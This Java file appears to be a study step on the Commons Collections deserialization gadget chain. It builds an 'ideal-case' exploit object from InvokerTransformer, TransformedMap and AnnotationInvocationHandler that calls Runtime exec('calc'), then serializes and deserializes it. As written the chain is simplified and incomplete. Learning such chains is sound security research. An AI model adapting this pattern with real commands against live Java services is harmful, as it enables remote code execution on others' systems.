package FinalTransformMapEXP;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

// 理想情况的 EXP
public class TransformMapImagineEXP {
    public static void main(String[] args) throws Exception{

        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec"
                , new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("key", "value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        aihConstructor.setAccessible(true);
        Object o = aihConstructor.newInstance(Override.class, transformedMap);

        // 序列化反序列化
        serialize(o);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
